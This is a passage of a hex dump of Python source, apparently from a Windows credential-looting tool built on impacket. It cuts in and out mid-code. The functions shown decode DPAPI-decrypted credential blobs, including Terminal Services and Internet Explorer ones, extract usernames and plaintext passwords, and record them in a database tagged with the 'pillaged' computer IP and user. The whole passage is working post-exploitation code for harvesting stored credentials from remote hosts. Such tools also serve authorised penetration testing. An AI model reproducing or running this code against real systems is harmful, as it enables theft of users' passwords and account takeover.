-0000cff0: 6f75 6e74 0a09 0965 7863 6570 7420 4578  ount...except Ex
-0000d000: 6365 7074 696f 6e20 6173 2065 783a 0a09  ception as ex:..
-0000d010: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
-0000d020: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
-0000d030: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
-0000d040: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
-0000d050: 5741 524e 494e 477d 4578 6365 7074 2032  WARNING}Except 2
-0000d060: 2070 726f 6365 7373 5f64 6563 7279 7074   process_decrypt
-0000d070: 6564 5f64 6174 6120 414c 4c20 666f 7220  ed_data ALL for 
-0000d080: 7b6c 6f63 616c 6669 6c65 7d20 7b62 636f  {localfile} {bco
-0000d090: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-0000d0a0: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
-0000d0b0: 7567 2865 7829 0a0a 0964 6566 2064 756d  ug(ex)...def dum
-0000d0c0: 705f 6372 6564 656e 7469 616c 5f62 6c6f  p_credential_blo
-0000d0d0: 6228 7365 6c66 2c20 7573 6572 2c20 6c6f  b(self, user, lo
-0000d0e0: 6361 6c66 696c 652c 2064 6563 7279 7074  calfile, decrypt
-0000d0f0: 6564 5f62 6c6f 6229 3a0a 0909 2320 6672  ed_blob):...# fr
-0000d100: 6f6d 2069 6d70 6163 6b65 742e 6573 6520  om impacket.ese 
-0000d110: 696d 706f 7274 2067 6574 556e 6978 5469  import getUnixTi
-0000d120: 6d65 0a09 0974 7279 3a0a 0909 0973 656c  me...try:....sel
-0000d130: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-0000d140: 2244 756d 7069 6e67 2064 6563 7279 7074  "Dumping decrypt
-0000d150: 6564 2063 7265 6465 6e74 6961 6c20 626c  ed credential bl
-0000d160: 6f62 2069 6e66 6f20 746f 2066 696c 6522  ob info to file"
-0000d170: 290a 0909 0923 2073 656c 662e 6c6f 6767  )....# self.logg
-0000d180: 696e 672e 6465 6275 6728 6465 6372 7970  ing.debug(decryp
-0000d190: 7465 645f 626c 6f62 290a 0909 0969 6e66  ted_blob)....inf
-0000d1a0: 6f20 3d20 225c 6e22 0a09 0909 696e 666f  o = "\n"....info
-0000d1b0: 202b 3d20 6622 5b43 5245 4445 4e54 4941   += f"[CREDENTIA
-0000d1c0: 4c5d 5c6e 220a 0909 0974 7279 3a0a 0909  L]\n"....try:...
-0000d1d0: 0909 696e 666f 202b 3d20 6622 4c61 7374  ..info += f"Last
-0000d1e0: 5772 6974 7465 6e20 3a20 7b64 6174 6574  Written : {datet
-0000d1f0: 696d 652e 7574 6366 726f 6d74 696d 6573  ime.utcfromtimes
-0000d200: 7461 6d70 2869 6d70 6163 6b65 742e 6470  tamp(impacket.dp
-0000d210: 6170 692e 6765 7455 6e69 7854 696d 6528  api.getUnixTime(
-0000d220: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
-0000d230: 4c61 7374 5772 6974 7465 6e27 5d29 297d  LastWritten']))}
-0000d240: 5c6e 220a 0909 0909 696e 666f 202b 3d20  \n".....info += 
-0000d250: 6622 466c 6167 7320 2020 2020 2020 3a20  f"Flags       : 
-0000d260: 7b64 6563 7279 7074 6564 5f62 6c6f 625b  {decrypted_blob[
-0000d270: 2746 6c61 6773 275d 7d20 287b 696d 7061  'Flags']} ({impa
-0000d280: 636b 6574 2e64 7061 7069 2e67 6574 466c  cket.dpapi.getFl
-0000d290: 6167 7328 696d 7061 636b 6574 2e64 7061  ags(impacket.dpa
-0000d2a0: 7069 2e43 5245 4445 4e54 4941 4c5f 464c  pi.CREDENTIAL_FL
-0000d2b0: 4147 532c 2064 6563 7279 7074 6564 5f62  AGS, decrypted_b
-0000d2c0: 6c6f 625b 2746 6c61 6773 275d 297d 295c  lob['Flags'])})\
-0000d2d0: 6e22 0a09 0909 0969 6e66 6f20 2b3d 2066  n".....info += f
-0000d2e0: 2250 6572 7369 7374 2020 2020 203a 2030  "Persist     : 0
-0000d2f0: 787b 6465 6372 7970 7465 645f 626c 6f62  x{decrypted_blob
-0000d300: 5b27 5065 7273 6973 7427 5d7d 2028 7b69  ['Persist']} ({i
-0000d310: 6d70 6163 6b65 742e 6470 6170 692e 4352  mpacket.dpapi.CR
-0000d320: 4544 454e 5449 414c 5f50 4552 5349 5354  EDENTIAL_PERSIST
-0000d330: 2864 6563 7279 7074 6564 5f62 6c6f 625b  (decrypted_blob[
-0000d340: 2750 6572 7369 7374 275d 292e 6e61 6d65  'Persist']).name
-0000d350: 7d29 5c6e 220a 0909 0909 696e 666f 202b  })\n".....info +
-0000d360: 3d20 6622 5479 7065 2020 2020 2020 2020  = f"Type        
-0000d370: 3a20 3078 7b64 6563 7279 7074 6564 5f62  : 0x{decrypted_b
-0000d380: 6c6f 625b 2754 7970 6527 5d7d 2028 7b69  lob['Type']} ({i
-0000d390: 6d70 6163 6b65 742e 6470 6170 692e 4352  mpacket.dpapi.CR
-0000d3a0: 4544 454e 5449 414c 5f50 4552 5349 5354  EDENTIAL_PERSIST
-0000d3b0: 2864 6563 7279 7074 6564 5f62 6c6f 625b  (decrypted_blob[
-0000d3c0: 2754 7970 6527 5d29 2e6e 616d 657d 295c  'Type']).name})\
-0000d3d0: 6e22 0a09 0909 0973 656c 662e 6c6f 6767  n".....self.logg
-0000d3e0: 696e 672e 6465 6275 6728 696e 666f 290a  ing.debug(info).
-0000d3f0: 0909 0965 7863 6570 7420 4578 6365 7074  ...except Except
-0000d400: 696f 6e20 6173 2065 783a 0a09 0909 0973  ion as ex:.....s
-0000d410: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-0000d420: 6728 0a09 0909 0909 6622 5b7b 7365 6c66  g(......f"[{self
-0000d430: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-0000d440: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
-0000d450: 524e 494e 477d 4578 6365 7074 696f 6e20  RNING}Exception 
-0000d460: 3120 6465 6372 7970 7465 645f 626c 6f62  1 decrypted_blob
-0000d470: 2e61 7474 7269 6275 7465 7320 7b62 636f  .attributes {bco
-0000d480: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-0000d490: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-0000d4a0: 6275 6728 6578 290a 0909 0969 6e66 6f20  bug(ex)....info 
-0000d4b0: 2b3d 2066 2254 6172 6765 7420 2020 2020  += f"Target     
-0000d4c0: 203a 207b 6465 6372 7970 7465 645f 626c   : {decrypted_bl
-0000d4d0: 6f62 5b27 5461 7267 6574 275d 2e64 6563  ob['Target'].dec
-0000d4e0: 6f64 6528 2775 7466 2d31 366c 6527 297d  ode('utf-16le')}
-0000d4f0: 5c6e 220a 0909 0969 6e66 6f20 2b3d 2066  \n"....info += f
-0000d500: 2244 6573 6372 6970 7469 6f6e 203a 207b  "Description : {
-0000d510: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
-0000d520: 4465 7363 7269 7074 696f 6e27 5d2e 6465  Description'].de
-0000d530: 636f 6465 2827 7574 662d 3136 6c65 2729  code('utf-16le')
-0000d540: 7d5c 6e22 0a09 0909 696e 666f 202b 3d20  }\n"....info += 
-0000d550: 6622 556e 6b6e 6f77 6e20 2020 2020 3a20  f"Unknown     : 
-0000d560: 7b64 6563 7279 7074 6564 5f62 6c6f 625b  {decrypted_blob[
-0000d570: 2755 6e6b 6e6f 776e 275d 2e64 6563 6f64  'Unknown'].decod
-0000d580: 6528 2775 7466 2d31 366c 6527 297d 5c6e  e('utf-16le')}\n
-0000d590: 220a 0909 0969 6e66 6f20 2b3d 2066 2255  "....info += f"U
-0000d5a0: 7365 726e 616d 6520 2020 203a 207b 6465  sername    : {de
-0000d5b0: 6372 7970 7465 645f 626c 6f62 5b27 5573  crypted_blob['Us
-0000d5c0: 6572 6e61 6d65 275d 2e64 6563 6f64 6528  ername'].decode(
-0000d5d0: 2775 7466 2d31 366c 6527 297d 5c6e 220a  'utf-16le')}\n".
-0000d5e0: 0909 0974 7279 3a0a 0909 0909 696e 666f  ...try:.....info
-0000d5f0: 202b 3d20 6622 556e 6b6e 6f77 6e33 2020   += f"Unknown3  
-0000d600: 2020 203a 207b 6465 6372 7970 7465 645f     : {decrypted_
-0000d610: 626c 6f62 5b27 556e 6b6e 6f77 6e33 275d  blob['Unknown3']
-0000d620: 2e64 6563 6f64 6528 2775 7466 2d31 366c  .decode('utf-16l
-0000d630: 6527 297d 5c6e 220a 0909 0909 7061 7373  e')}\n".....pass
-0000d640: 776f 7264 203d 2066 227b 6465 6372 7970  word = f"{decryp
-0000d650: 7465 645f 626c 6f62 5b27 556e 6b6e 6f77  ted_blob['Unknow
-0000d660: 6e33 275d 2e64 6563 6f64 6528 2775 7466  n3'].decode('utf
-0000d670: 2d31 366c 6527 297d 220a 0909 0965 7863  -16le')}"....exc
-0000d680: 6570 7420 556e 6963 6f64 6544 6563 6f64  ept UnicodeDecod
-0000d690: 6545 7272 6f72 3a0a 0909 0909 696e 666f  eError:.....info
-0000d6a0: 202b 3d20 6622 556e 6b6e 6f77 6e33 2e20   += f"Unknown3. 
-0000d6b0: 2020 2020 3a20 7b64 6563 7279 7074 6564      : {decrypted
-0000d6c0: 5f62 6c6f 625b 2755 6e6b 6e6f 776e 3327  _blob['Unknown3'
-0000d6d0: 5d2e 6465 636f 6465 2827 6c61 7469 6e2d  ].decode('latin-
-0000d6e0: 3127 297d 5c6e 220a 0909 0909 7061 7373  1')}\n".....pass
-0000d6f0: 776f 7264 203d 2066 227b 6465 6372 7970  word = f"{decryp
-0000d700: 7465 645f 626c 6f62 5b27 556e 6b6e 6f77  ted_blob['Unknow
-0000d710: 6e33 275d 2e64 6563 6f64 6528 276c 6174  n3'].decode('lat
-0000d720: 696e 2d31 2729 7d22 0a09 0909 2320 7072  in-1')}"....# pr
-0000d730: 696e 7428 290a 0909 0969 6620 2257 696e  int()....if "Win
-0000d740: 646f 7773 4c69 7665 3a74 6172 6765 743d  dowsLive:target=
-0000d750: 7669 7274 7561 6c61 7070 2220 6e6f 7420  virtualapp" not 
-0000d760: 696e 2066 227b 6465 6372 7970 7465 645f  in f"{decrypted_
-0000d770: 626c 6f62 5b27 5461 7267 6574 275d 2e64  blob['Target'].d
-0000d780: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
-0000d790: 297d 223a 2020 2320 2257 696e 646f 7773  )}":  # "Windows
-0000d7a0: 4c69 7665 3a74 6172 6765 743d 7669 7274  Live:target=virt
-0000d7b0: 7561 6c61 7070 2f64 6964 6c6f 6769 6361  ualapp/didlogica
-0000d7c0: 6c22 204f 6e20 6e65 2067 6572 6520 7061  l" On ne gere pa
-0000d7d0: 7320 706f 7572 206c 6520 6d6f 6d65 6e74  s pour le moment
-0000d7e0: 2f2f 2041 2076 6f69 7220 706f 7572 2072  // A voir pour r
-0000d7f0: 6173 7365 6d62 6c65 7220 6c65 2063 6f6e  assembler le con
-0000d800: 7465 6e75 2065 6e20 3120 6e6f 7576 6561  tenu en 1 nouvea
-0000d810: 7520 626c 6f62 203f 0a09 0909 0966 6f72  u blob ?.....for
-0000d820: 2065 6e74 7279 2069 6e20 6465 6372 7970   entry in decryp
-0000d830: 7465 645f 626c 6f62 2e61 7474 7269 6275  ted_blob.attribu
-0000d840: 7465 733a 0a09 0909 0909 7472 793a 0a09  tes:......try:..
-0000d850: 0909 0909 0969 6e66 6f20 2b3d 2066 224b  .....info += f"K
-0000d860: 6579 576f 7264 203a 207b 656e 7472 795b  eyWord : {entry[
-0000d870: 274b 6579 576f 7264 275d 2e64 6563 6f64  'KeyWord'].decod
-0000d880: 6528 2775 7466 2d31 366c 6527 297d 5c6e  e('utf-16le')}\n
-0000d890: 220a 0909 0909 0909 696e 666f 202b 3d20  ".......info += 
-0000d8a0: 6622 466c 6167 7320 2020 3a20 7b65 6e74  f"Flags   : {ent
-0000d8b0: 7279 5b27 466c 6167 7327 5d7d 2c20 7b69  ry['Flags']}, {i
-0000d8c0: 6d70 6163 6b65 742e 6470 6170 692e 6765  mpacket.dpapi.ge
-0000d8d0: 7446 6c61 6773 2843 5245 4445 4e54 4941  tFlags(CREDENTIA
-0000d8e0: 4c5f 464c 4147 532c 2065 6e74 7279 5b27  L_FLAGS, entry['
-0000d8f0: 466c 6167 7327 5d29 7d5c 6e22 0a09 0909  Flags'])}\n"....
-0000d900: 0909 0969 6e66 6f20 2b3d 2066 2244 6174  ...info += f"Dat
-0000d910: 6120 2020 203a 207b 656e 7472 795b 2744  a    : {entry['D
-0000d920: 6174 6127 5d7d 5c6e 220a 0909 0909 0965  ata']}\n"......e
-0000d930: 7863 6570 7420 4578 6365 7074 696f 6e20  xcept Exception 
-0000d940: 6173 2065 783a 0a09 0909 0909 0973 656c  as ex:.......sel
-0000d950: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-0000d960: 0a09 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
-0000d970: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
-0000d980: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
-0000d990: 524e 494e 477d 4578 6365 7074 696f 6e20  RNING}Exception 
-0000d9a0: 3220 6465 6372 7970 7465 645f 626c 6f62  2 decrypted_blob
-0000d9b0: 2e61 7474 7269 6275 7465 7320 7b62 636f  .attributes {bco
-0000d9c0: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
-0000d9d0: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
-0000d9e0: 6465 6275 6728 6578 290a 0909 0909 0909  debug(ex).......
-0000d9f0: 656e 7472 792e 6475 6d70 2829 0a09 0909  entry.dump()....
-0000da00: 0909 0963 6f6e 7469 6e75 650a 0a09 0909  ...continue.....
-0000da10: 2323 2323 2323 2323 2323 2323 5052 4f43  ############PROC
-0000da20: 4553 5349 4e47 2044 4154 410a 0909 0973  ESSING DATA....s
-0000da30: 656c 662e 6462 2e61 6464 5f63 7265 647a  elf.db.add_credz
-0000da40: 2863 7265 647a 5f74 7970 653d 2763 7265  (credz_type='cre
-0000da50: 6465 6e74 6961 6c2d 626c 6f62 272c 0a09  dential-blob',..
-0000da60: 0909 0909 0909 2020 6372 6564 7a5f 7573  ......  credz_us
-0000da70: 6572 6e61 6d65 3d64 6563 7279 7074 6564  ername=decrypted
-0000da80: 5f62 6c6f 625b 2755 7365 726e 616d 6527  _blob['Username'
-0000da90: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
-0000daa0: 6c65 2729 2c0a 0909 0909 0909 0920 2063  le'),........  c
-0000dab0: 7265 647a 5f70 6173 7377 6f72 643d 7061  redz_password=pa
-0000dac0: 7373 776f 7264 2c0a 0909 0909 0909 0920  ssword,........ 
-0000dad0: 2063 7265 647a 5f74 6172 6765 743d 6465   credz_target=de
-0000dae0: 6372 7970 7465 645f 626c 6f62 5b27 5461  crypted_blob['Ta
-0000daf0: 7267 6574 275d 2e64 6563 6f64 6528 2775  rget'].decode('u
-0000db00: 7466 2d31 366c 6527 292c 0a09 0909 0909  tf-16le'),......
-0000db10: 0909 2020 6372 6564 7a5f 7061 7468 3d6c  ..  credz_path=l
-0000db20: 6f63 616c 6669 6c65 2c0a 0909 0909 0909  ocalfile,.......
-0000db30: 0920 2070 696c 6c61 6765 645f 6672 6f6d  .  pillaged_from
-0000db40: 5f63 6f6d 7075 7465 725f 6970 3d73 656c  _computer_ip=sel
-0000db50: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
-0000db60: 5f69 702c 0a09 0909 0909 0909 2020 7069  _ip,........  pi
-0000db70: 6c6c 6167 6564 5f66 726f 6d5f 7573 6572  llaged_from_user
-0000db80: 6e61 6d65 3d75 7365 722e 7573 6572 6e61  name=user.userna
-0000db90: 6d65 290a 0a09 0909 7365 6c66 2e6c 6f67  me).....self.log
-0000dba0: 6769 6e67 2e64 6562 7567 2869 6e66 6f29  ging.debug(info)
-0000dbb0: 0a09 0909 7265 7475 726e 2069 6e66 6f0a  ....return info.
-0000dbc0: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
-0000dbd0: 6f6e 2061 7320 6578 3a0a 0909 0973 656c  on as ex:....sel
-0000dbe0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-0000dbf0: 0a09 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
-0000dc00: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
-0000dc10: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
-0000dc20: 4e47 7d45 7863 6570 7469 6f6e 2033 2064  NG}Exception 3 d
-0000dc30: 756d 705f 6372 6564 656e 7469 616c 5f62  ump_credential_b
-0000dc40: 6c6f 6220 7b62 636f 6c6f 7273 2e45 4e44  lob {bcolors.END
-0000dc50: 437d 2229 0a09 0909 7365 6c66 2e6c 6f67  C}")....self.log
-0000dc60: 6769 6e67 2e64 6562 7567 2865 7829 0a0a  ging.debug(ex)..
-0000dc70: 0964 6566 2064 756d 705f 4352 4544 454e  .def dump_CREDEN
-0000dc80: 5449 414c 5f54 5345 2873 656c 662c 2075  TIAL_TSE(self, u
-0000dc90: 7365 722c 206c 6f63 616c 6669 6c65 2c20  ser, localfile, 
-0000dca0: 6465 6372 7970 7465 645f 626c 6f62 293a  decrypted_blob):
-0000dcb0: 0a09 0923 2066 726f 6d20 696d 7061 636b  ...# from impack
-0000dcc0: 6574 2e65 7365 2069 6d70 6f72 7420 6765  et.ese import ge
-0000dcd0: 7455 6e69 7854 696d 650a 0909 7472 793a  tUnixTime...try:
-0000dce0: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
-0000dcf0: 2e64 6562 7567 2822 4475 6d70 696e 6720  .debug("Dumping 
-0000dd00: 5453 4520 6465 6372 7970 7465 6420 6372  TSE decrypted cr
-0000dd10: 6564 656e 7469 616c 2062 6c6f 6220 696e  edential blob in
-0000dd20: 666f 2074 6f20 6669 6c65 2229 0a09 0909  fo to file")....
-0000dd30: 2320 7365 6c66 2e6c 6f67 6769 6e67 2e64  # self.logging.d
-0000dd40: 6562 7567 2864 6563 7279 7074 6564 5f62  ebug(decrypted_b
-0000dd50: 6c6f 6229 0a09 0909 696e 666f 203d 2022  lob)....info = "
-0000dd60: 5c6e 220a 0909 0969 6e66 6f20 2b3d 2066  \n"....info += f
-0000dd70: 225b 4352 4544 454e 5449 414c 5d5c 6e22  "[CREDENTIAL]\n"
-0000dd80: 0a09 0909 7472 793a 0a09 0909 0969 6e66  ....try:.....inf
-0000dd90: 6f20 2b3d 2066 224c 6173 7457 7269 7474  o += f"LastWritt
-0000dda0: 656e 203a 207b 6461 7465 7469 6d65 2e75  en : {datetime.u
-0000ddb0: 7463 6672 6f6d 7469 6d65 7374 616d 7028  tcfromtimestamp(
-0000ddc0: 696d 7061 636b 6574 2e64 7061 7069 2e67  impacket.dpapi.g
-0000ddd0: 6574 556e 6978 5469 6d65 2864 6563 7279  etUnixTime(decry
-0000dde0: 7074 6564 5f62 6c6f 625b 274c 6173 7457  pted_blob['LastW
-0000ddf0: 7269 7474 656e 275d 2929 7d5c 6e22 0a09  ritten']))}\n"..
-0000de00: 0909 0969 6e66 6f20 2b3d 2066 2246 6c61  ...info += f"Fla
-0000de10: 6773 2020 2020 2020 203a 207b 6465 6372  gs       : {decr
-0000de20: 7970 7465 645f 626c 6f62 5b27 466c 6167  ypted_blob['Flag
-0000de30: 7327 5d7d 2028 7b69 6d70 6163 6b65 742e  s']} ({impacket.
-0000de40: 6470 6170 692e 6765 7446 6c61 6773 2869  dpapi.getFlags(i
-0000de50: 6d70 6163 6b65 742e 6470 6170 692e 4352  mpacket.dpapi.CR
-0000de60: 4544 454e 5449 414c 5f46 4c41 4753 2c20  EDENTIAL_FLAGS, 
-0000de70: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
-0000de80: 466c 6167 7327 5d29 7d29 5c6e 220a 0909  Flags'])})\n"...
-0000de90: 0909 696e 666f 202b 3d20 6622 5065 7273  ..info += f"Pers
-0000dea0: 6973 7420 2020 2020 3a20 3078 7b64 6563  ist     : 0x{dec
-0000deb0: 7279 7074 6564 5f62 6c6f 625b 2750 6572  rypted_blob['Per
-0000dec0: 7369 7374 275d 7d20 287b 696d 7061 636b  sist']} ({impack
-0000ded0: 6574 2e64 7061 7069 2e43 5245 4445 4e54  et.dpapi.CREDENT
-0000dee0: 4941 4c5f 5045 5253 4953 5428 6465 6372  IAL_PERSIST(decr
-0000def0: 7970 7465 645f 626c 6f62 5b27 5065 7273  ypted_blob['Pers
-0000df00: 6973 7427 5d29 2e6e 616d 657d 295c 6e22  ist']).name})\n"
-0000df10: 0a09 0909 0969 6e66 6f20 2b3d 2066 2254  .....info += f"T
-0000df20: 7970 6520 2020 2020 2020 203a 2030 787b  ype        : 0x{
-0000df30: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
-0000df40: 5479 7065 275d 7d20 287b 696d 7061 636b  Type']} ({impack
-0000df50: 6574 2e64 7061 7069 2e43 5245 4445 4e54  et.dpapi.CREDENT
-0000df60: 4941 4c5f 5045 5253 4953 5428 6465 6372  IAL_PERSIST(decr
-0000df70: 7970 7465 645f 626c 6f62 5b27 5479 7065  ypted_blob['Type
-0000df80: 275d 292e 6e61 6d65 7d29 5c6e 220a 0909  ']).name})\n"...
-0000df90: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
-0000dfa0: 6e20 6173 2065 783a 0a09 0909 0973 656c  n as ex:.....sel
-0000dfb0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
-0000dfc0: 0a09 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
-0000dfd0: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
-0000dfe0: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
-0000dff0: 494e 477d 4578 6365 7074 696f 6e20 3120  ING}Exception 1 
-0000e000: 6465 6372 7970 7465 645f 626c 6f62 2e61  decrypted_blob.a
-0000e010: 7474 7269 6275 7465 7320 7b62 636f 6c6f  ttributes {bcolo
-0000e020: 7273 2e45 4e44 437d 2229 0a09 0909 0973  rs.ENDC}").....s
-0000e030: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
-0000e040: 6728 6578 290a 0909 0969 6e66 6f20 2b3d  g(ex)....info +=
-0000e050: 2066 2254 6172 6765 7420 2020 2020 203a   f"Target      :
-0000e060: 207b 6465 6372 7970 7465 645f 626c 6f62   {decrypted_blob
-0000e070: 5b27 5461 7267 6574 275d 2e64 6563 6f64  ['Target'].decod
-0000e080: 6528 2775 7466 2d31 366c 6527 297d 5c6e  e('utf-16le')}\n
-0000e090: 220a 0909 0969 6e66 6f20 2b3d 2066 2244  "....info += f"D
-0000e0a0: 6573 6372 6970 7469 6f6e 203a 207b 6465  escription : {de
-0000e0b0: 6372 7970 7465 645f 626c 6f62 5b27 4465  crypted_blob['De
-0000e0c0: 7363 7269 7074 696f 6e27 5d2e 6465 636f  scription'].deco
-0000e0d0: 6465 2827 7574 662d 3136 6c65 2729 7d5c  de('utf-16le')}\
-0000e0e0: 6e22 0a09 0909 696e 666f 202b 3d20 6622  n"....info += f"
-0000e0f0: 556e 6b6e 6f77 6e20 2020 2020 3a20 7b64  Unknown     : {d
-0000e100: 6563 7279 7074 6564 5f62 6c6f 625b 2755  ecrypted_blob['U
-0000e110: 6e6b 6e6f 776e 275d 2e64 6563 6f64 6528  nknown'].decode(
-0000e120: 2775 7466 2d31 366c 6527 297d 5c6e 220a  'utf-16le')}\n".
-0000e130: 0909 0969 6e66 6f20 2b3d 2066 2255 7365  ...info += f"Use
-0000e140: 726e 616d 6520 2020 203a 207b 6465 6372  rname    : {decr
-0000e150: 7970 7465 645f 626c 6f62 5b27 5573 6572  ypted_blob['User
-0000e160: 6e61 6d65 275d 2e64 6563 6f64 6528 2775  name'].decode('u
-0000e170: 7466 2d31 366c 6527 297d 5c6e 220a 0909  tf-16le')}\n"...
-0000e180: 0974 7279 3a0a 0909 0909 696e 666f 202b  .try:.....info +
-0000e190: 3d20 6622 556e 6b6e 6f77 6e33 2020 2020  = f"Unknown3    
-0000e1a0: 203a 207b 6465 6372 7970 7465 645f 626c   : {decrypted_bl
-0000e1b0: 6f62 5b27 556e 6b6e 6f77 6e33 275d 2e64  ob['Unknown3'].d
-0000e1c0: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
-0000e1d0: 297d 5c6e 220a 0909 0909 7061 7373 776f  )}\n".....passwo
-0000e1e0: 7264 203d 2064 6563 7279 7074 6564 5f62  rd = decrypted_b
-0000e1f0: 6c6f 625b 2755 6e6b 6e6f 776e 3327 5d2e  lob['Unknown3'].
-0000e200: 6465 636f 6465 2827 7574 662d 3136 6c65  decode('utf-16le
-0000e210: 2729 0a09 0909 6578 6365 7074 2055 6e69  ')....except Uni
-0000e220: 636f 6465 4465 636f 6465 4572 726f 723a  codeDecodeError:
-0000e230: 0a09 0909 0969 6e66 6f20 2b3d 2066 2255  .....info += f"U
-0000e240: 6e6b 6e6f 776e 332e 2020 2020 203a 207b  nknown3.     : {
-0000e250: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
-0000e260: 556e 6b6e 6f77 6e33 275d 2e64 6563 6f64  Unknown3'].decod
-0000e270: 6528 276c 6174 696e 2d31 2729 7d5c 6e22  e('latin-1')}\n"
-0000e280: 0a09 0909 0970 6173 7377 6f72 6420 3d20  .....password = 
-0000e290: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
-0000e2a0: 556e 6b6e 6f77 6e33 275d 2e64 6563 6f64  Unknown3'].decod
-0000e2b0: 6528 276c 6174 696e 2d31 2729 0a09 0909  e('latin-1')....
-0000e2c0: 2323 2323 2323 2323 2323 2323 5052 4f43  ############PROC
-0000e2d0: 4553 5349 4e47 2044 4154 410a 0909 0973  ESSING DATA....s
-0000e2e0: 656c 662e 6462 2e61 6464 5f63 7265 647a  elf.db.add_credz
-0000e2f0: 2863 7265 647a 5f74 7970 653d 2762 726f  (credz_type='bro
-0000e300: 7773 6572 2d69 6e74 6572 6e65 745f 6578  wser-internet_ex
-0000e310: 706c 6f72 6572 272c 0a09 0909 0909 0909  plorer',........
-0000e320: 2020 6372 6564 7a5f 7573 6572 6e61 6d65    credz_username
-0000e330: 3d64 6563 7279 7074 6564 5f62 6c6f 625b  =decrypted_blob[
-0000e340: 2755 7365 726e 616d 6527 5d2e 6465 636f  'Username'].deco
-0000e350: 6465 2827 7574 662d 3136 6c65 2729 2c0a  de('utf-16le'),.
-0000e360: 0909 0909 0909 0920 2063 7265 647a 5f70  .......  credz_p
-0000e370: 6173 7377 6f72 643d 7061 7373 776f 7264  assword=password
-0000e380: 2c0a 0909 0909 0909 0920 2063 7265 647a  ,........  credz
-0000e390: 5f74 6172 6765 743d 6465 6372 7970 7465  _target=decrypte
-0000e3a0: 645f 626c 6f62 5b27 5461 7267 6574 275d  d_blob['Target']
-0000e3b0: 2e64 6563 6f64 6528 2775 7466 2d31 366c  .decode('utf-16l
-0000e3c0: 6527 292c 0a09 0909 0909 0909 2020 6372  e'),........  cr
-0000e3d0: 6564 7a5f 7061 7468 3d6c 6f63 616c 6669  edz_path=localfi
-0000e3e0: 6c65 2c0a 0909 0909 0909 0920 2070 696c  le,........  pil
-0000e3f0: 6c61 6765 645f 6672 6f6d 5f63 6f6d 7075  laged_from_compu
-0000e400: 7465 725f 6970 3d73 656c 662e 6f70 7469  ter_ip=self.opti
-0000e410: 6f6e 732e 7461 7267 6574 5f69 702c 0a09  ons.target_ip,..
-0000e420: 0909 0909 0909 2020 7069 6c6c 6167 6564  ......  pillaged
-0000e430: 5f66 726f 6d5f 7573 6572 6e61 6d65 3d75  _from_username=u
-0000e440: 7365 722e 7573 6572 6e61 6d65 290a 0909  ser.username)...
-0000e450: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-0000e460: 6275 6728 696e 666f 290a 0909 0972 6574  bug(info)....ret
-0000e470: 7572 6e20 696e 666f 0a09 0965 7863 6570  urn info...excep
-0000e480: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
-0000e490: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
-0000e4a0: 6e67 2e64 6562 7567 280a 0909 0909 6622  ng.debug(.....f"
-0000e4b0: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
-0000e4c0: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
-0000e4d0: 6f72 732e 5741 524e 494e 477d 4578 6365  ors.WARNING}Exce
-0000e4e0: 7074 696f 6e20 3320 6475 6d70 5f63 7265  ption 3 dump_cre
-0000e4f0: 6465 6e74 6961 6c5f 626c 6f62 207b 6263  dential_blob {bc
-0000e500: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
-0000e510: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
-0000e520: 6275 6728 6578 290a 0a09 6465 6620 6475  bug(ex)...def du
-0000e530: 6d70 5f43 5245 4445 4e54 4941 4c5f 4d53  mp_CREDENTIAL_MS
